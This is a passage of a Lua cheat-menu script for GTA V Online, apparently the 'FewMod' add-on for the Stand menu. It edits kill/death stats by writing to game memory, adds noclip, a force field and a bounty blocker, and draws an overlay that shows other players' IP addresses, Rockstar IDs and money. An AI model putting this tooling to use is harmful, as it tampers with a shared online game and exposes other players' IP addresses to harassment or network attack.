        cur_deaths = get_global_deaths
    else
        cur_deaths = get_stat_deaths
    end

    if get_global_ratio == get_stat_ratio then
        cur_ratio = get_global_ratio
    else
        cur_ratio = get_stat_ratio
    end
end)

if util.is_session_started() then

    menu.divider(kdedit, "Current KD")

    local cur_kills_display = menu.action(kdedit, "Current Kills: " .. cur_kills, { "" }, "Shows current kills.", function() end)

    local cur_death_display = menu.action(kdedit, "Current Deaths: " .. cur_deaths, { "" }, "Shows current deaths.", function() end)

    local cur_ratio_display = menu.action(kdedit, "Current Ratio: " .. cur_ratio, { "" }, "Shows current ratio.", function() end)

    menu.divider(kdedit, "New KD")

    local kills_slider_value = cur_kills
    local deaths_slider_value = cur_deaths

    local new_kills = menu.slider(kdedit, "New Kills Amount", {"killsamount"}, "Selects the number of kills.", -int_max, int_max, cur_kills, 1, function(value)
        kills_slider_value = value
    end)

    local new_deaths = menu.slider(kdedit, "New Deaths Amount", {"deathsamount"}, "Selects the number of deaths.", -int_max, int_max, cur_deaths, 1, function(value)
        deaths_slider_value = value
    end)

    util.create_tick_handler(function()
        new_ratio = menu.get_value(new_kills) / menu.get_value(new_deaths)
    end)

    local new_ratio_display = menu.action(kdedit, "New Ratio: " .. round(new_ratio, 2), { "" }, "Shows new ratio.", function()  end)

    menu.action(kdedit, "Set KD", { "setkd" }, "Sets your KD.", function()

        memory.write_int(global_kills, kills_slider_value)
        memory.write_int(global_deaths, deaths_slider_value)
        memory.write_float(global_ratio, new_ratio)

        STATS.STAT_SET_INT(kills_stat_hash, kills_slider_value, true)
        STATS.STAT_SET_INT(deaths_stat_hash, deaths_slider_value, true)
        STATS.STAT_SET_FLOAT(ratio_stat_hash, new_ratio, true)

        util.toast("Set your KD Ratio to " .. new_ratio)
    end)

    util.create_tick_handler(function()
        menu.set_menu_name(cur_kills_display, "Current Kills: " .. cur_kills)
        menu.set_menu_name(cur_death_display, "Current Deaths: " .. cur_deaths)
        menu.set_menu_name(cur_ratio_display, "Current Ratio: " .. round(cur_ratio, 2))
        menu.set_menu_name(new_ratio_display, "New Ratio: " .. new_ratio)
    end)
end

local Noclip2T1 = menu.list(selfc, "2T1 Noclip", {}, "")

menu.toggle_loop(Noclip2T1, "2T1 NoClip", {}, "", function()
    local lev = menu.get_value(rbp("Self>Movement>Levitation>Levitation"))
    local cam = players.get_cam_rot(players.user())
    local veh = PED.GET_VEHICLE_PED_IS_USING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    local ped = players.user_ped()
    if veh > 0 and inc_vehs then ent = veh else ent = ped end 
    if lev then
        ENTITY.SET_ENTITY_ROTATION(ent, cam.x, cam.y, cam.z)
    end
end, function()
    local cam = players.get_cam_rot(players.user())
    local veh = PED.GET_VEHICLE_PED_IS_USING(PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(players.user()))
    local ped = players.user_ped()
    if veh > 0 then ent = veh else ent = ped end
    ENTITY.SET_ENTITY_ROTATION(ent, 0.0, 0.0, cam.z)
end)

tog_veh = menu.toggle(Noclip2T1, "Include Vehicle", {}, "", function()
    inc_vehs = tog_veh.value
end, true)

menu.action(Noclip2T1, "Apply Recommended Profile", {}, "Apply changes to the levitation settings.", function()
    for _, value in ipairs({"Upward Force", "Downward Force", "Speed"}) do
        menu.set_value(rbp("Self>Movement>Levitation>" ..value), 0)
    end
    menu.set_value(rbp("Self>Movement>Levitation>Movement Ignores Pitch"), false)
end)

-----------------------------------------------------------------------------------------------------------------------

--client resolution/aspect ratio
local res_x, res_y = directx.get_client_size()
local ASPECT_RATIO <const> = res_x/res_y

--set position
gui_x = 0
gui_y = 0

--settings element sizing & spacing
name_h = 0.022
padding = 0.008
spacing = 0.003
gui_w = 0.16

--settings text sizing & spacing
name_size = 0.52
text_size = 0.41
line_spacing = 0.0032

local playerinformation = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'
local maptex = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\Map.png'
local bliptex = filesystem.scripts_dir() .. '\\FewMod\\'.. '\\textures\\'.. '\\Blip.png'

if not filesystem.exists(playerinformation) then
    util.toast("You Are Missing The FewMod Folder & or Required Textures, Please Install It From Github Using The Hyperlink Found In Stand>Misc \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    util.log("You Are Missing The FewMod Folder & or Required Textures, Please Install It From Github Using The Hyperlink Found In Stand>Misc \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    util.yield(300)
    goto skipplayerinformation
elseif filesystem.exists(playerinformation) then

    if not filesystem.exists(maptex) and not filesystem.exists(bliptex) then
        util.toast("You Are Missing Textures For PlayerInformation in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
        util.log("You Are Missing Textures For PlayerInformation in FewMod/textures Please Ensure To Install It. \nhttps://github.com/Fewdys/GTA5-FewMod-Lua")
    elseif filesystem.exists(maptex) and filesystem.exists(bliptex) then
        textures = {
            map = directx.create_texture(filesystem.scripts_dir() .. "FewMod/textures/Map.png"),
            blip = directx.create_texture(filesystem.scripts_dir() .. "FewMod/textures/Blip.png")
        }
    end

function drawRect(x, y, w, h, colour)
    directx.draw_rect(x, y, w, h, 
    {r = colour.r * colour.a, g = colour.g * colour.a, b = colour.b * colour.a, a = colour.a})
end

--settings border
border_width = 0
function border_widthd(on_change)
    border_width = on_change/1000
end

--set infocolours
infocolour = {
    title_bar = {r = 0, g = 0, b = 0, a = 1},
    background = {r = 0, g = 0, b = 0, a = 130/255},
    health_bar = {r = 114/255, g = 204/255, b = 114/255, a = 150/255},
    armour_bar = {r = 70/255, g = 136/255, b = 171/255, a = 150/255},
    blip = {r = 1, g = 0, b = 0, a = 1},
    map = {r = 1, g = 1, b = 1, a = 191/255},
    name = {r = 1, g = 1, b = 1, a = 1},
    label = {r = 1, g = 1, b = 1, a = 1},
    info = {r = 1, g = 1, b = 1, a = 1},
    border = {r = 1, g = 0, b = 1, a = 1}
}

function title_bar_color(on_change)
    infocolour.title_bar = on_change
end

function drawBorder(x, y, width, height)
    local border_x = border_width/ASPECT_RATIO
    drawRect(x - border_x, y, width + border_x * 2, -border_width, infocolour.border) --top
    drawRect(x, y, -border_x, height, infocolour.border) --left
    drawRect(x + width, y, border_x, height, infocolour.border) --right
    drawRect(x - border_x, y + height, width + border_x * 2, border_width, infocolour.border) --bottom
end

function roundNum(num, decimals)
    local mult = 10^(decimals or 0)
    return math.floor(num * mult + 0.5) / mult
end

--weapon function
all_weapons = {}
local temp_weapons = util.get_weapons()
for a, b in pairs(temp_weapons) do
    all_weapons[#all_weapons + 1] = {hash = b["hash"], label_key = b["label_key"]}
end
function hashToWeapon(hash) 
    for k, v in pairs(all_weapons) do 
        if v.hash == hash then 
            return util.get_label_text(v.label_key)
        end
    end
    return "Unarmed"
end
--boolean function
function boolText(bool)
    if bool then return "Yes" else return "No" end
end
--check function
function checkValue(pInfo)
    if pInfo == "" or pInfo == 0 or pInfo == nil or pInfo == "NULL" then return "None" else return pInfo end 
end
--format money
function formatMoney(money)
    local order = math.ceil(string.len(tostring(money))/3 - 1)
    if order == 0 then return money end
    return roundNum(money/(1000^order), 1)..({"K", "M", "B"})[order]
end

NETWORK1={
    ["_NETWORK_SET_ENTITY_INVISIBLE_TO_NETWORK"]=function(--[[Entity (int)]] entity,--[[BOOL (bool)]] toggle)native_invoker.begin_call();native_invoker.push_arg_int(entity);native_invoker.push_arg_bool(toggle);native_invoker.end_call("F1CA12B18AEF5298");end,
    ["_GET_ONLINE_VERSION"]=function()native_invoker.begin_call();native_invoker.end_call("FCA9373EF340AC0A");return native_invoker.get_return_value_string();end,
    ["_NETWORK_GET_AVERAGE_LATENCY_FOR_PLAYER"]=--[[float]] function(--[[Player (int)]] player)native_invoker.begin_call();native_invoker.push_arg_int(player);native_invoker.end_call("D414BE129BB81B32");return native_invoker.get_return_value_float();end,
    ["_SHUTDOWN_AND_LOAD_MOST_RECENT_SAVE"]=--[[BOOL (bool)]] function()native_invoker.begin_call();native_invoker.end_call("9ECA15ADFE141431");return native_invoker.get_return_value_bool();end,
    ["NETWORK_GET_AVERAGE_LATENCY"]=function(...)return native_invoker.uno_float(0xD414BE129BB81B32,...)end,
}

function dec_to_ipv4(ip)
	return string.format(
		"%i.%i.%i.%i", 
		ip >> 24 & 0xFF, 
		ip >> 16 & 0xFF, 
		ip >> 8  & 0xFF, 
		ip 		 & 0xFF
	)
end

function encode(text)
	return string.gsub(text, "%s", "+")
end

function decode(text)
	return string.gsub(text, "%+", " ")
end

local function ipcheckself(player_id)
    if player_id == players.user() then return "Hidden" else return dec_to_ipv4(players.get_connect_ip(player_id)) end
end

local function interiorcheck(player_id)
    if not players.is_in_interior(player_id) then return "Not In Interior" elseif players.is_in_interior(player_id) then return Fewd.get_interior_player_is_in(player_id) end
end

---@param player Player
---@return boolean
function is_player_passive(player)
	if player ~= players.user() then
		local address = memory.script_global(1894573 + (player * 608 + 1) + 8)
		if address ~= NULL then return memory.read_byte(address) == 1 end
	else
		local address = memory.script_global(1574582)
		if address ~= NULL then return memory.read_int(address) == 1 end
	end
	return false
end

local function is_player_modder(pid)
    local suffix = players.is_marked_as_modder(pid) and " has set off modder detections." or " hasn't set off modder detections."
    chat.send_message(players.get_name(pid) .. suffix,
    true, -- is team chat
    true, -- is in local history
    false -- is networked
    )
end

handle_ptr = memory.alloc(13*8)

function pid_to_handle(player_id)
    NETWORK.NETWORK_HANDLE_FROM_PLAYER(player_id, handle_ptr, 13)
    return handle_ptr
end

----main function
function infoverplaytoggle()
    local focused = players.get_focused()
    if ((focused[1] ~= nil and focused[2] == nil) or render_window) and menu.is_open() then
        --general info grabbing locals
        local player_id = focused[1]
        local hdl = pid_to_handle(player_id)
        if render_window then player_id = players.user() end
        local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local my_pos, player_pos = players.get_position(players.user()), players.get_position(player_id)
    
        --general element drawing locals
        local spacing_x = spacing/ASPECT_RATIO
        local padding_x = padding/ASPECT_RATIO
        local player_list_y = gui_y + name_h + spacing
        local total_w = gui_w + padding_x * 4
        local heading = ENTITY.GET_ENTITY_HEADING(ped)
        local regions = 
        {
            {
                width = total_w/2,
                content =
                {
                    {"Rank", players.get_rank(player_id)},
                    {"K/D", roundNum(players.get_kd(player_id), 2)},
                    {"Wallet", "$"..formatMoney(players.get_wallet(player_id))},
                    {"Bank", "$"..formatMoney(players.get_bank(player_id))}
                }
            },
            {
                width = total_w/2,
                content =
                {
                    {"Language", ({"English","French","German","Italian","Spanish","Brazilian","Polish","Russian","Korean","Traditional Chinese","Japanese","Mexican","Simplified Chinese"})[players.get_language(player_id) + 1]},
                    {"Controller", boolText(players.is_using_controller(player_id))},
                    {"Ping", math.floor(NETWORK1._NETWORK_GET_AVERAGE_LATENCY_FOR_PLAYER(player_id) + 0.5).." ms"},
                    {"Host Sequence", "#"..players.get_host_queue_position(player_id)},
                }
            },
            {
                width = total_w + spacing_x,
                content =
                {
                    {"Model", util.reverse_joaat(ENTITY.GET_ENTITY_MODEL(ped))},
                    {"Area", util.get_label_text(ZONE.GET_NAME_OF_ZONE(player_pos.x, player_pos.y, player_pos.z))},
                    {"Weapon", hashToWeapon(WEAPON.GET_SELECTED_PED_WEAPON(ped))},
                    {"Vehicle", checkValue(util.get_label_text(players.get_vehicle_model(player_id)))}
                }
            },
            {
                width = total_w/2,
                content =
                {
                    {"Distance", math.floor(MISC.GET_DISTANCE_BETWEEN_COORDS(player_pos.x, player_pos.y, player_pos.z, my_pos.x, my_pos.y, my_pos.z)).." m"},
                    {"Speed", math.floor(ENTITY.GET_ENTITY_SPEED(ped) * 3.6).." km/h"},
                    {"Torward", ({"North","West","South","East","West"})[math.ceil((heading + 45)/90)]..", "..math.ceil(heading).."°"}
                }
            },
            {
                width = total_w/2,
                content =
                {
                    {"Organization", ({"None","CEO","MC"})[players.get_org_type(player_id) + 2]},
                    {"Wanted", PLAYER.GET_PLAYER_WANTED_LEVEL(player_id).."/5"},
                    {"Cutscene", boolText(NETWORK.IS_PLAYER_IN_CUTSCENE(player_id))}
                }
            },
            {
                width = total_w + spacing_x,
                content =
                {
                    {"Rockstar ID", checkValue(players.get_rockstar_id(player_id))},
                    {"Tags/Labels", checkValue(players.get_tags_string(player_id))},
                    {"IP", ipcheckself(player_id)}
                }
            },
            {
                width = total_w/2,
                content =
                {
                    {"GodMode", boolText(players.is_godmode(player_id))},
                    {"Passive Mode", boolText(is_player_passive(player_id))},
                    {"Attacked You", boolText(players.is_marked_as_attacker(player_id))},
                    {"Modder", boolText(players.is_marked_as_modder(player_id))}
                }
            },
            {
                width = total_w/2,
                content =
                {
                    {"Friend", boolText(NETWORK.NETWORK_IS_FRIEND(hdl))},
                    {"Host", boolText(player_id == players.get_host())},
                    {"Script Host", boolText(player_id == players.get_script_host())},
                    {"Off The Radar", boolText(players.is_otr(player_id))}
                }
            },
            {
                width = total_w + spacing_x,
                content =
                {
                    {"Interior", boolText(players.is_in_interior(player_id))},
                    {"Interior ID", interiorcheck(player_id)},
                    {"Visible", boolText(players.is_visible(player_id))},
                }
            },
        }

        local font_w, font_h = directx.get_text_size("ABCDEFG", text_size)
        local offset_x = 0
        local offset_y = 0
        for k, region in ipairs(regions) do
            local count = 0
            for _ in region.content do count = count + 1 end
            local dict_h = count * (font_h + line_spacing) - line_spacing + padding * 2
            drawBorder(gui_x + offset_x, player_list_y + offset_y, region.width, dict_h)
            drawRect(gui_x + offset_x, player_list_y + offset_y, region.width, dict_h, infocolour.background)
            local line_count = 0
            for _, v in ipairs(region.content) do
                directx.draw_text(
                gui_x + offset_x + padding_x - 0.001, 
                player_list_y + offset_y + padding + line_count * (font_h + line_spacing), 
                v[1]..": ",
                ALIGN_TOP_LEFT, 
                text_size, 
                infocolour.label
                )
                directx.draw_text(
                gui_x + offset_x + region.width - padding_x - 0.001, 
                player_list_y + offset_y + padding + line_count * (font_h + line_spacing), 
                v[2], 
                ALIGN_TOP_RIGHT, 
                text_size, 
                infocolour.info
                )
                line_count += 1
            end
            offset_x += region.width + spacing_x
            if offset_x >= total_w then
                offset_y += dict_h + spacing
                offset_x = 0
            end
        end

        local gui_h = offset_y - spacing
        local bar_w = gui_h/50
        local map_x = gui_x + total_w + spacing_x * 2
        local map_w = gui_h/(898/590)/ASPECT_RATIO + 0.001
        local map_w_total = map_w + padding_x * 3 + bar_w

        drawBorder(gui_x, gui_y, total_w + spacing_x, name_h)
        drawRect(gui_x, gui_y, total_w + spacing_x, name_h, infocolour.title_bar)
        directx.draw_text(gui_x + total_w/2, gui_y + name_h/2, players.get_name(player_id), ALIGN_CENTRE, name_size, infocolour.name)
        drawBorder(map_x, gui_y, map_w_total, name_h)
        drawRect(map_x, gui_y, map_w_total, name_h, infocolour.title_bar)
        drawBorder(map_x, player_list_y, map_w_total, gui_h)
        drawRect(map_x, player_list_y, map_w_total, gui_h, infocolour.background)
        directx.draw_texture(textures.map, map_w/2, gui_h, 0.5, 0.5, map_x + padding_x * 2 + bar_w + map_w/2 , player_list_y + gui_h/2, 0, infocolour.map)
        directx.draw_texture(textures.blip, 0.004, 0, 0.5, 0.5, map_x + padding_x * 2 + bar_w + ((player_pos.x + 4000)/8500) * map_w, player_list_y + (1 - (player_pos.y + 4000)/12000) * gui_h, (360 - heading)/360, infocolour.blip)

        local armour_perc = PED.GET_PED_ARMOUR(ped)/PLAYER.GET_PLAYER_MAX_ARMOUR(player_id)
        local armour_bar_bg = {r = infocolour.armour_bar.r/2, g = infocolour.armour_bar.g/2, b = infocolour.armour_bar.b/2, a = infocolour.armour_bar.a}
        drawRect(map_x + padding_x, player_list_y + gui_h/2 - padding/2, bar_w, -((gui_h - padding * 3)/2 * armour_perc), infocolour.armour_bar) --foreground
        drawRect(map_x + padding_x, player_list_y + padding, bar_w, (gui_h - padding * 3)/2 * (1 - armour_perc), armour_bar_bg) --background

        local health_min = ENTITY.GET_ENTITY_HEALTH(ped) - 100
        if health_min < 0 then health_min = 0 end

        local health_perc = health_min/(ENTITY.GET_ENTITY_MAX_HEALTH(ped) - 100)
        local health_bar_bg = {r = infocolour.health_bar.r/2, g = infocolour.health_bar.g/2, b = infocolour.health_bar.b/2, a = infocolour.health_bar.a}

        drawRect(map_x + padding_x, player_list_y + gui_h - padding, bar_w, -((gui_h - padding * 3)/2 * health_perc), infocolour.health_bar) --foreground
        drawRect(map_x + padding_x, player_list_y + gui_h/2 + padding/2, bar_w, (gui_h - padding * 3)/2 * (1 - health_perc), health_bar_bg) --background
    end
end

----------------------------------------------------------------------------------------------------------------------------------
    --Taken From JerryScript
    local ragdolloptions = menu.list(selfc, "Ragdoll Options", {}, "Superman Options & Gracefulness Must Be Off")

    menu.toggle_loop(ragdolloptions, "Better clumsiness", {"extraclumsy"}, "Like stands clumsiness, but you can get up after you fall. \nSuperman Options & Gracefulness Must Be Off", function()
        if PED.IS_PED_RAGDOLL(players.user_ped()) then 
            util.yield(3000)
        end
        PED.SET_PED_RAGDOLL_ON_COLLISION(players.user_ped(), true)
    end)

    menu.action(ragdolloptions, "Stumble", {"selfstumble"}, "Makes you stumble with a good chance of falling over. \nSuperman Options & Gracefulness Must Be Off", function()
        local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
        PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
    end)

    local fallTimeout = false
    menu.toggle(ragdolloptions, "Fall over", {"fallOver"}, "Makes you stumble, fall over and prevents you from getting back up. \nSuperman Options & Gracefulness Must Be Off", function(toggle)
        if toggle then
            local vector = ENTITY.GET_ENTITY_FORWARD_VECTOR(players.user_ped())
            PED.SET_PED_TO_RAGDOLL_WITH_FALL(players.user_ped(), 1500, 2000, 2, vector.x, -vector.y, vector.z, 1, 0, 0, 0, 0, 0, 0)
        end
        fallTimeout = toggle
        while fallTimeout do
            PED.RESET_PED_RAGDOLL_TIMER(players.user_ped())
            util.yield_once()
        end
    end)

    menu.toggle_loop(ragdolloptions, "Ragdoll", {"ragdollmyself"}, "Just Makes You Ragdoll. \nSuperman Options & Gracefulness Must Be Off", function()
        PED.SET_PED_TO_RAGDOLL(players.user_ped(), 2000, 2000, 0, true, true, true)
    end)

----------------------------------------------------------------------------------------------------------------------------------


menu.toggle_loop(selfc, "Fast Roll", {"fastroll"}, "", function()
    STATS.STAT_SET_INT(util.joaat("MP"..util.get_char_slot().."_SHOOTING_ABILITY"), 350, true)
end)

menu.toggle_loop(selfc, "Anti-Bounty's", {"bountysoff"}, "Turns off bounty's. Keep toggled if bounty's persis", function()
    if util.is_session_started() then
        if memory.read_int(memory.script_global(1835502 + 4 + 1 + (players.user() * 3))) == 1 then
            memory.write_int(memory.script_global(2815059 + 1856 + 17), -1)
            memory.write_int(memory.script_global(2359296 + 1 + 5149 + 13), 2880000)
        end
    end
end)

menu.toggle(selfc, "Cold blooded", {}, "Removes your thermal signal.\nSome players can still se you though.", function(toggle)
    local player = players.user_ped()
    local ped = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player)
    if toggle then
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 0)
    else
        PED.SET_PED_HEATSCALE_OVERRIDE(ped, 1)
    end
end)

menu.toggle_loop(selfc, "Without Animation", {}, "You change your weapons faster.", function()
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 56) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 92) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
    if (TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 160) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 167) or TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 165)) and not TASK.GET_IS_TASK_ACTIVE(players.user_ped(), 195) then
        PED.FORCE_PED_AI_AND_ANIMATION_UPDATE(players.user_ped())
    end
end)

local maxHealth <const> = 328
menu.toggle_loop(selfc, ("Off the radar"), {"undeadotr"}, "", function()
    if ENTITY.GET_ENTITY_MAX_HEALTH(Fewd.pwayerp) ~= 0 then
		ENTITY.SET_ENTITY_MAX_HEALTH(Fewd.pwayerp, 0)
	end
end, function ()
	ENTITY.SET_ENTITY_MAX_HEALTH(Fewd.pwayerp, maxHealth)
end)

local s_forcefield_range = 230
local s_forcefield = 0
local s_forcefield_names = {
    [0] = "Push",
    [1] = "Pull"
}

menu.toggle_loop(selfc, "Force Field", {"sforcefield"}, "", function()
    if players.exists(players.user()) then
        local _entities = {}
        local player_pos = players.get_position(players.user())

        for _, vehicle in pairs(entities.get_all_vehicles_as_handles()) do
            local vehicle_pos = ENTITY.GET_ENTITY_COORDS(vehicle, false)
            if v3.distance(player_pos, vehicle_pos) <= s_forcefield_range then
                table.insert(_entities, vehicle)
            end
        end
        for _, ped in pairs(entities.get_all_peds_as_handles()) do
            local ped_pos = ENTITY.GET_ENTITY_COORDS(ped, false)
            if (v3.distance(player_pos, ped_pos) <= s_forcefield_range) and not PED.IS_PED_A_PLAYER(ped) then
                table.insert(_entities, ped)
            end
        end
        for i, entity in pairs(_entities) do
            local player_vehicle = PED.GET_VEHICLE_PED_IS_IN(players.user_ped(), true)
            local entity_type = ENTITY.GET_ENTITY_TYPE(entity)

            if NETWORK.NETWORK_REQUEST_CONTROL_OF_ENTITY(entity) and not (player_vehicle == entity) then
                local force = ENTITY.GET_ENTITY_COORDS(entity)
                v3.sub(force, player_pos)
                v3.normalise(force)

                if (s_forcefield == 1) then
                    v3.mul(force, -1)
                end
                if (entity_type == 1) then
                    PED.SET_PED_TO_RAGDOLL(entity, 2500, 0, 0, false, false, false)
                end

                ENTITY.APPLY_FORCE_TO_ENTITY(
                    entity, 3, force.x, force.y, force.z, 0, 0, 0.8, 0, false, false, true, false, false
                )
            end
        end
    end
end)

menu.toggle(selfc, "Quiet FootSteps", {}, "Removes the sound of your feet. (Networked)", function(toggle)
    AUDIO.SET_PED_FOOTSTEPS_EVENTS_ENABLED(PLAYER.PLAYER_PED_ID(), not toggle)
end)

menu.toggle(selfc, "Friendly Fire", {}, "Turns on the friendly Fire.", function(toggle)
    PED.SET_CAN_ATTACK_FRIENDLY(players.user_ped(), toggle, false)
end)

menu.slider(selfc, "Local Transparency", {"transparency"}, "Sets How Visible You Are Locally", 0, 100, 100, 20, function(value)
    if value > 80 then
        ENTITY.RESET_ENTITY_ALPHA(players.user_ped())
    else
        ENTITY.SET_ENTITY_ALPHA(players.user_ped(), value * 2.55, false)
    end
end)

-------------------------------------------------------------------------------------------------------------------------------------------

--Taken From WiriScript

local defaultHealth = ENTITY.GET_ENTITY_MAX_HEALTH(players.user_ped())
local moddedHealth = defaultHealth
local defaultArmour = PED.GET_PED_ARMOUR(players.user_ped())
local moddedArmour = defaultArmour
local healthslider
local armourslider

---@param entity Entity
---@param value integer
local SetEntityMaxHealth = function(entity, value)
	local maxHealth = ENTITY.GET_ENTITY_MAX_HEALTH(entity)
	if maxHealth ~= value then
		PED.SET_PED_MAX_HEALTH(entity, value)
		ENTITY.SET_ENTITY_HEALTH(entity, value, 0)
	end
end

---@param player Player
---@param value integer
local SetEntityMaxArmour = function(player, value)
	local maxArmour = PLAYER.GET_PLAYER_MAX_ARMOUR(player)
	if maxArmour ~= value then
		PED.SET_PED_ARMOUR(player, value, 0)
		--PLAYER.SET_PED_ARMOUR(entity, value, 0)
	end
end

menu.toggle_loop(selfc, "Mod Max Health", {"modhealth"}, "", function ()
	SetEntityMaxHealth(players.user_ped(), moddedHealth)
    menu.trigger_commands("maxhealth")
end, function ()
	SetEntityMaxHealth(players.user_ped(), defaultHealth)
	menu.set_value(healthslider, defaultHealth)
end)

healthslider = menu.slider(selfc, "Set Max Health", {"moddedhealth"}, "", 0, 9000, defaultHealth, 10, function(value, prev, click)
	moddedHealth = value
end)

menu.toggle_loop(selfc, "Mod Max Armour", {"modarmour"}, "Theoretically This Should Work", function ()
	SetEntityMaxArmour(players.user_ped(), moddedArmour)
    menu.trigger_commands("maxarmour")
end, function ()
	SetEntityMaxArmour(players.user_ped(), defaultArmour)
	menu.set_value(armourslider, defaultArmour)
end)

armourslider = menu.slider(selfc, "Set Max Armour", {"moddedarmour"}, "", 100, 9000, defaultArmour, 10, function(value, prev, click)
	moddedHealth = value
end)

-------------------------------------
-- REFILL HEALTH IN COVER
-------------------------------------

menu.toggle_loop(selfc, "Refill Health in Cover", {"healincover"}, "", function()
	if PED.IS_PED_IN_COVER(players.user_ped(), false) then
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MAX_PERCENT(players.user_ped(), 1.0)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user_ped(), 15.0)
        menu.trigger_commands("maxhealth")
	else
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MAX_PERCENT(players.user_ped(), 0.5)
		PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user_ped(), 1.0)
	end
end, function ()
	PLAYER.SET_PLAYER_HEALTH_RECHARGE_MAX_PERCENT(players.user_ped(), 0.25)
	PLAYER.SET_PLAYER_HEALTH_RECHARGE_MULTIPLIER(players.user_ped(), 1.0)
end)

menu.toggle_loop(selfc, "Refill Armour in Cover", {"armourincover"}, "", function()
	if PED.IS_PED_IN_COVER(players.user_ped(), false) then
        menu.trigger_commands("maxarmour")
	end
end)

-------------------------------------
-- REFILL HEALTH
-------------------------------------

menu.action(selfc, "Refill Health", {"maxhealth"}, "", function()
	local maxHealth = PED.GET_PED_MAX_HEALTH(players.user_ped())
	ENTITY.SET_ENTITY_HEALTH(players.user_ped(), maxHealth, 0)
end)

-------------------------------------
-- REFILL ARMOUR
-------------------------------------

menu.action(selfc, "Refill Armour", {"maxarmour"}, "", function()
	local armour = util.is_session_started() and 50 or 100
	PED.SET_PED_ARMOUR(players.user_ped(), armour)
end)

--------------------------------------------------------------------------------------------------------------------------------------------
--------------------------------------------------------------------------------------------------------------------------------------------
--Online
function GetPlayerName_pid(player_id)
    local playerName = NETWORK.NETWORK_PLAYER_GET_NAME(player_id)
    return playerName
end

function CheckLobbyForGodmode()
    local godcount = 0
    for i = 0, 31 do
        if NETWORK.NETWORK_IS_PLAYER_CONNECTED(i) then
            local pcoords = ENTITY.GET_ENTITY_COORDS(PLAYER.GET_PLAYER_PED(i))
            if INTERIOR.GET_INTERIOR_AT_COORDS(pcoords.x, pcoords.y, pcoords.z) == 0 then --check for non-interior. Using native for less false flags.
                if (not PLAYER.IS_PLAYER_READY_FOR_CUTSCENE(i)) and (not NETWORK.IS_PLAYER_IN_CUTSCENE(i)) then --check for cutscenes
                    if players.is_godmode(i) then --check the actual god
                        local pName = GetPlayerName_pid(i)
                        util.toast(pName .. " is in GodMode")
                        godcount = godcount + 1
                        util.yield(100)
                    end
                end
            end
        end
    end
    util.toast(godcount .. " players in GodMode")
end

function getModderList()
    local list = {}
    for i=0, 31 do
        if players.exists(i) and (players.is_godmode(i) or players.is_marked_as_modder(i) or players.is_marked_as_attacker(i)) then
            table.insert(list, i)
        end
    end
    return list
end

function playerListToNames(input)
    local output = {}
    for i,v in pairs(input) do
        if players.exists(v) then
            table.insert(output, players.get_name(v))
        end
    end
    return output
end

local modderlistinclude

menu.divider(online, "Normal Stuff")

menu.toggle_loop(online, "ESP Friends", {}, "Will draw a line directly to all friends.", function()
    for _, player_id in players.list(false, true, false) do
        local c = ENTITY.GET_ENTITY_COORDS(players.user_ped())
        local p = PLAYER.GET_PLAYER_PED_SCRIPT_INDEX(player_id)
        local j = ENTITY.GET_ENTITY_COORDS(p)
        GRAPHICS.DRAW_LINE(c.x, c.y, c.z, j.x, j.y, j.z, 255, 255, 255, 255)
    end
end)

menu.toggle(online, "Include ModderList On Toast Join", {"modderlist"}, "Sends the sessions list of modders to you as a notification", function(mli)
    modderlistinclude = mli
    --local modders = getModderList()
    --util.toast("Modders in this session ("..table.getn(modders).."): "..table.concat(playerListToNames(getModderList()), ", "))
end)

local join_ing = false
function CheckLobbyForPlayers()
    local buffer = join_ing
    join_ing = NETWORK.NETWORK_IS_SESSION_STARTED()
    util.yield(7500)
    local playersTable = players.list()
    if buffer ~= join_ing then
        for i = 1, 5 do
            util.yield(1750)
            util.toast("Players in session: " .. #playersTable)
            util.yield(10)
            if modderlistinclude then
            local modders = getModderList()
            util.toast("Modders In This Session ("..table.getn(modders).."): "..table.concat(playerListToNames(getModderList()), ", "))
            end
        end
    end
end

menu.toggle_loop(online, "Toast Players When Joining", {}, "Toasts number of players when you join a new session.", function ()
    CheckLobbyForPlayers()
end)

local interiors = {
    {"Safe Space [AFK Room]", {x=-158.71494, y=-982.75885, z=149.13135}, ""},
    {"Hideout", {x=2696.41, y=-386.14, z=-55.34}, ""},
    {"Open Space", {x=360.54, y=-1011.98, z=29.31}, ""},
    {"Open Space v2", {x=1484.25, y=-1904.02, z=71.73}, ""},
    {"Leave Me Be", {x=-1599.43, y=5197.92, z=4.31}, ""},
    {"Military Base Tower", {x=-2360.53, y=3244.87, z=92.90}, ""},
    {"Broken FIB Building", {x=151.58, y=-741.82, z=254.15}, ""},
    {"Centry Manor Hotel Garage", {x=-69.80, y=356.14, z=112.44}, ""},
    {"Couch Place", {x=-1199.88, y=-180.54, z=39.33}, ""},
    {"Fleeca Bank", {x=146.10, y=-1038.33, z=29.36}, ""},
    {"Roof Hot-Tub", {x=-855.35, y=-227.03, z=61.03}, ""},
    {"House Garage", {x=-1372.51, y=-474.71, z=31.59}, ""},
    {"Torture Room", {x=147.170, y=-2201.804, z=4.688}, ""},
